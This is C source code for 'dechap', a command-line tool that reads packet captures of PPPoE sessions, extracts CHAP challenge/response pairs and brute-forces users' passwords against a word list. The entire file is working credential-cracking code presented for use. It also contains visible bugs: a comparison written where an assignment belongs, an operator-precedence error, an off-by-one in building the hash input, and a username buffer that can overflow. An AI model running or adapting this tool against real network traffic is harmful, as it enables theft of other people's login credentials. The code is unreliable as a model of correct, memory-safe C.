#include <openssl/md5.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "dechap.h"

#define SWVERSION "v0.1 alpha"
#define SWRELEASEDATE "January 2013"

// "dechap" attempts to recover credentials from packet captures of PPPoE CHAP authentications.
// Written by Foeh Mannay
// Please refer to http://networkbodges.blogspot.com for more information about this tool.
// This software is released under the Modified BSD license.

params_t *parseParams(int argc, char *argv[]){
	// Returns a struct with various parameters or NULL if invalid
	unsigned int i = 1;
	params_t *parameters = (params_t*)malloc(sizeof(params_t));
	if(parameters == NULL) return(NULL);

	// There must be 4 parameters
	if(argc != 5) return(NULL);

	// Set some defaults
	parameters->capfile = NULL;
	parameters->wordfile = NULL;

	// Look for the various flags, then store the corresponding value
	while(i < argc){
		if(strcmp(argv[i],"-c") == 0){
			parameters->capfile = argv[++i];
			i++;
			continue;
		}
		if(strcmp(argv[i],"-w") == 0){
			parameters->wordfile = argv[++i];
			i++;
			continue;
		}
		// If we get any unrecognised parameters just fail
		return(NULL);
	}

	// If the input files still aren't set, bomb
	if(parameters->capfile == NULL || parameters->wordfile == NULL) return(NULL);

	return(parameters);
}

auth_instance_t *decap(char *data, int length, char type, auth_instance_t *ai){
// The decap() function takes in a  pointer to a (partial) frame, the size of the 
// data, a hint indicating the encap type and a pointer to an authentication instance
// template which is populated as the various layers of encap are stripped away.
	int chaplen = 0;

	// Some sanity checks
	if(data == NULL) return(NULL);
	if(ai == NULL) return(NULL);

	// Based on current encap type, try to determine what the next encap type will be
	switch(type){
		case ETHERNET:
			if(length < 14) return(NULL);
			
			// Populate the source and destination MACs then check the EtherType
			memcpy(ai->dmac, data, 6);
			memcpy(ai->smac, data + 6, 6);
			
			// VLAN tag next?
			if(memcmp(data+12, "\x81\x00", 2) == 0 || memcmp(data+12, "\x91\x00", 2) == 0){
				return(decap(data + 14, length - 14, VLAN, ai));
			}
			// MPLS tag next?
			if(memcmp(data+12, "\x88\x47", 2) == 0){
				return(decap(data + 14, length - 14, MPLS, ai));
			}
			// PPPoE session data next?
			if(memcmp(data+12, "\x88\x64", 2) == 0){
				return(decap(data + 14, length - 14, PPPoE, ai));
			}
		break;
		case VLAN:
			if(length < 4) return(NULL);
			// Populate the VLAN ID(s):
			// If there is already an inner VLAN, move it to an outer
			if(ai->cvlan != 0) ai->svlan = ai->cvlan;
			// Store this VLAN as the inner
			ai->cvlan = (256*data[0] & 15) + data[1];
			
			// Now  determine the next encap type from the EtherType
			// VLAN tag next?
			if(memcmp(data+2, "\x81\x00", 2) == 0 || memcmp(data+2, "\x91\x00",2) == 0){
				return(decap(data + 4, length - 4, VLAN, ai));
			}
			// MPLS tag next?
			if(memcmp(data+2, "\x88\x47", 2) == 0){
				return(decap(data + 4, length - 4, MPLS, ai));
			}
			// PPPoE session data next?
			if(memcmp(data+2, "\x88\x64", 2) == 0){
				return(decap(data + 4, length - 4, PPPoE, ai));
			}
		break;
		case MPLS:
			if(length < 4) return(NULL);
			// Check bottom of stack bit to decide whether to keep stripping MPLS or try for Ethernet
			if(data[2] & 1 == 0) return(decap(data + 4, length - 4, MPLS, ai));	// Not BOS, more MPLS
			else return(decap(data + 4, length - 4, ETHERNET, ai));				// BOS - try for Ethernet
		break;
		case PPPoE:
			// Only a PPP header can follow a PPPoE session header
			if(length < 6) return(NULL);
			// Populate the PPPoE SID
			ai->pppoesid = (data[2] * 256) + data[3];
			return(decap(data + 6, length - 6, PPP, ai));
		break;
		case PPP:
			// If the protocol is CHAP, decode it. If not, bail out.
			if(length < 2) return(NULL);
			if(memcmp(data, "\xc2\x23", 2) == 0){
				return(decap(data + 2, length - 2, CHAP, ai));
			}
			else return(NULL);
		break;
		case CHAP:
			if(length < 4) return(NULL);
			// We only care about challenges and responses, so success and failure messages are ignored.
			switch(data[0]){
				case CHAP_CHALLENGE:	// If it's a challenge:
					// Populate the auth ID, challenge data and challenge length.
					ai->authid = data[1];
					ai->cr = CHAP_CHALLENGE;
					ai->length = data[4];
					ai->data = (char*)malloc(ai->length);
					if(ai->data == NULL){
						printf("Could not malloc %u bytes for CHAP challenge data!\n",ai->length);
						return(NULL);
					}
					memcpy(ai->data, data + 5, ai->length);
					return(ai);
				break;
				case CHAP_RESPONSE:		// If it's a response:
					// Populate the auth ID, response data and username.
					ai->authid = data[1];
					ai->cr = CHAP_RESPONSE;
					ai->length = data[4];	// Should always be 16 but why take chances?
					ai->data = (char*)malloc(ai->length);
					if(ai->data == NULL){
						printf("Could not malloc %u bytes for CHAP response data!\n",ai->length);
						return(NULL);
					}
					memcpy(ai->data, data + 5, ai->length);
					chaplen = (256 * data[2]) + data[3];
					ai->username = (char*)malloc(chaplen - (ai->length + 4));
					if(ai->username == NULL){
						printf("Could not malloc %u bytes for CHAP username!\n",chaplen - (ai->length + 4));
						return(NULL);
					}
					memcpy(ai->username, data + 5 + ai->length, chaplen - (ai->length + 5));
					ai->username[chaplen - (ai->length + 5)] = '\x00';	// Null-terminate the username for later use.
					return(ai);
				break;
				default:			// We have no interest in success or failure messages as there is nothing to attack.
					return(NULL);
			}
	}
	return(NULL);
}

void clean(auth_instance_t *ai){
// Populates an authentication instance with default values
	if(ai == NULL) return;
	
	memcpy(ai->dmac, "\x00\x00\x00\x00\x00\x00", 6);
	memcpy(ai->smac, "\x00\x00\x00\x00\x00\x00", 6);
	ai->svlan = 0;
	ai->cvlan = 0;
	ai->pppoesid = 0;
	ai->authid = 0;
	ai->cr = CHAP_NONE;
	ai->length = 0;
	ai->data = NULL;
	ai->username = NULL;
}

auth_list_item_t *graft(auth_list_item_t *root, auth_list_item_t *newitem){
// Adds an authentication list item to an existing list (or NULL), returning
// a pointer to the root.
	auth_list_item_t *current = root;
	if(root == NULL) return(newitem);

	while(current->next != NULL) current = current->next;
	current->next = newitem;
	newitem->prev = current;
	return(root);
}

auth_list_item_t *node(auth_instance_t *item){
// Creates an authentication list item from an authentication instance.
	auth_list_item_t *n = (auth_list_item_t*)malloc(sizeof(auth_list_item_t));
	
	if(n == NULL) return(NULL);
	n->item = item;
	n->next = NULL;
	n->prev = NULL;
	return(n);
}

puzzle_t *addpuzzle(puzzle_t *root, auth_list_item_t *challenge, auth_list_item_t *response){
// Generates a puzzle from a challenge / response pair and appends it to the list of puzzles.
	puzzle_t *current;
	puzzle_t *newnode = (puzzle_t*)malloc(sizeof(puzzle_t));
	
	if(newnode == NULL){
		printf("Error: Could not allocate memory for puzzle!");
		return(root);
	}
	
	newnode->next = NULL;
	newnode->authid = challenge->item->authid;
	newnode->length = challenge->item->length;
	newnode->challenge = challenge->item->data;
	newnode->response = response->item->data;
	newnode->username = response->item->username;
	newnode->password == NULL;
	
	if(root == NULL) return(newnode);
	for(current = root; current->next != NULL; current = current->next);
	current->next = newnode;
	return(root);
}

auth_list_item_t *parse_pcap(FILE *capfile){
	char 				*memblock = NULL;
	auth_list_item_t	*chaps = NULL;
	auth_instance_t		*ai = NULL,
						*decapai = NULL;
	guint32				caplen = 0;

	// Start parsing the capture file:
	rewind(capfile);
	clearerr(capfile);
	memblock = (char*)malloc(sizeof(pcap_hdr_t));
	if(memblock == NULL){
		printf("Insufficient memory to load capture header.\n");
		return(NULL);
	}
	// Read the pcap header
	if(fread (memblock, 1, sizeof(pcap_hdr_t), capfile) != sizeof(pcap_hdr_t)){
		printf("Truncated capture file header - aborting.\n");
		free(memblock);
		return(NULL);
	}
	// Verify the magic number in the header indicates a pcap file
	if(((pcap_hdr_t*)memblock)->magic_number != 2712847316){
		printf("\nError!\nThis is not a valid pcap file. If it has been saved as pcap-ng\nconsider converting it to original pcap format with tshark or similar.\n");
		free(memblock); 
		return(NULL);
	}
	
	// Generate an authentication instance template ready to use
	ai = (auth_instance_t*)malloc(sizeof(auth_instance_t));
	if(ai == NULL){
		printf("Error: could not allocate memory for authentication instance!\n");
		return(NULL);
	}

		// Read in the packets and search for any CHAP. Store the challenges and responses in a list.
	while(feof(capfile) | ferror(capfile) == 0){
		free(memblock);
		// Get the packet record header and examine it for the packet size
		memblock = malloc(sizeof(pcaprec_hdr_t));
		if(memblock == NULL){
			printf("Error: Could not allocate memory for pcap record header!\n");
			return(NULL);
		}
		if(fread (memblock, 1, sizeof(pcaprec_hdr_t), capfile) != sizeof(pcaprec_hdr_t)){
//			printf("Error: Truncated pcap file reading record header!\n");
			break;
		}
		caplen = ((pcaprec_hdr_t*)memblock)->incl_len;
		free(memblock);
		memblock = malloc(caplen);
		if(memblock == NULL){
			printf("Error: Could not allocate memory for pcap record header!\n");
			return(NULL);
		}
		// Get the actual packet data and attempt to parse it
		if(fread (memblock, 1, caplen, capfile) != caplen){
			printf("Error: Truncated pcap file reading capture!\n");
			break;
		}
		
		// Start with a fresh authentication instance template.
		clean(ai);
		decapai = decap(memblock, caplen, ETHERNET, ai);
		if(decapai != NULL){
		// We found some CHAP, so store it
			// Generate a fresh authentication instance template for use in the next round
			ai = (auth_instance_t*)malloc(sizeof(auth_instance_t));
			if(ai == NULL){
				printf("Error: could not allocate memory for authentication instance!\n");
				return(NULL);
			}
			// Then store the current authentication instance in a list
			chaps = graft(chaps, node(decapai));
		}
	}
	free(memblock);
	return(chaps);
}

puzzle_t *pair_up(auth_list_item_t *chaps){
	puzzle_t			*puzzles = NULL;
	auth_list_item_t 	*response = NULL,
						*challenge = NULL;

	// Now cycle through the responses and find their corresponding challenges
	// This is done by working forward through the list until we find a response,
	// then working backwards from there to find the most recent challenge that 
	// matches that PPP session based on MAC address, S&C VLAN, PPPoE session
	// ID and authentication ID.
	for(response = chaps; response != NULL; response = response->next){
		if(response->item->cr == CHAP_CHALLENGE) continue;
		for(challenge = response; challenge != NULL; challenge = challenge->prev){
			// Go through previous challenges to find one matching our response
			if(challenge->item->cr == CHAP_CHALLENGE &&
				memcmp(challenge->item->smac, response->item->dmac, 6) == 0 &&
				memcmp(challenge->item->dmac, response->item->smac, 6) == 0 &&
				challenge->item->svlan == response->item->svlan &&
				challenge->item->cvlan == response->item->cvlan &&
				challenge->item->pppoesid == response->item->pppoesid &&
				challenge->item->authid == response->item->authid)
					break;
		}
		// If we can't find a matching challenge then we can't do anything.
		if(challenge == NULL) continue;
		
		// If we did find a match, create an entry in our list of hashes.
		puzzles = addpuzzle(puzzles, challenge, response);
	}
	return(puzzles);
}

void crack(puzzle_t *puzzles, FILE *wordfile){
// Attempts to solve challenge / response "puzzles" using candidate passwords
// from a word list.
 
	puzzle_t			*currentpuzzle = NULL;
	char				*password = (char*)malloc(256),
						tuple[512],
						hash[16];
	int					pwlen = 0;

	for(currentpuzzle = puzzles; currentpuzzle != NULL; currentpuzzle = currentpuzzle->next){
		rewind(wordfile);
		while(feof(wordfile) == 0){
			if(fgets(password, 255, wordfile) == NULL) break;
			pwlen = strlen(password);
			if(pwlen > 0 && password[pwlen-1] == '\n') password[pwlen-1] = '\x00';
			// Next job is to concatenate the auth ID with the plaintext password and the challenge data:
			tuple[0] = (char)currentpuzzle->authid;
			strcpy(tuple+1, password);
			memcpy(tuple+pwlen, currentpuzzle->challenge, currentpuzzle->length);
			// Obtain the MD5 hash of this and compare it to the one in the CHAP response:
			MD5(tuple, pwlen + currentpuzzle->length , hash);
			if(memcmp(hash, currentpuzzle->response, 16) == 0){
				printf("Found password \"%s\" for user %s.\n", password, currentpuzzle->username);
				currentpuzzle->password = strdup(password);
			}
		}
		if(currentpuzzle->password == NULL) printf("Unable to find a password for user %s.\n", currentpuzzle->username);
	}
}

int main(int argc, char *argv[]){
// The main function basically just calls other functions to do the work.
	params_t			*parameters = NULL;
	FILE				*capfile = NULL,
						*wordfile = NULL;
	auth_list_item_t 	*chaps = NULL;
	puzzle_t			*puzzles = NULL;
	
	// Parse our command line parameters and verify they are usable. If not, show help.
	parameters = parseParams(argc, argv);
	if(parameters == NULL){
		printf("De-CHAP brute-forcer for PPPoE traffic\nVersion %s, %s\n\n", SWVERSION, SWRELEASEDATE);
		printf("Usage:\n");
		printf("%s -c capfile -w wordfile\n\n",argv[0]);
		printf("Where capfile is a tcpdump-style .cap file containing CHAP authentications\n");
		printf("and wordfile is a plain text file containing password guesses.\n");
		return(1);
	}
	
	// Attempt to open the capture file and word list:
	capfile = fopen(parameters->capfile,"rb");
	if (capfile == NULL) {
		printf("\nError!\nUnable to open capture file!\n");
		return(1);
	}
	wordfile = fopen(parameters->wordfile, "r");
	if(wordfile == NULL){
		printf("Error - could not open wordfile!\n");
		return(1);
	}
	
	// Parse the pcap file and store any authentications found in the list:
	chaps = parse_pcap(capfile);
	if(chaps == NULL){
		printf("No authentications loaded from capture.\n");
		return(1);
	}
	fclose(capfile);
	
	// Now pair up the authentication instances (challenges and responses) into
	// "puzzles" which can brute-forced later.
	puzzles = pair_up(chaps);
	
	
	// Now we have our puzzles, let's crack some passwords.
	if(puzzles == NULL){
		printf("No challenge / response pairs could be generated.\n");
		return(1);
	}
	crack(puzzles, wordfile);
	fclose(wordfile);
	
	return(0);
}

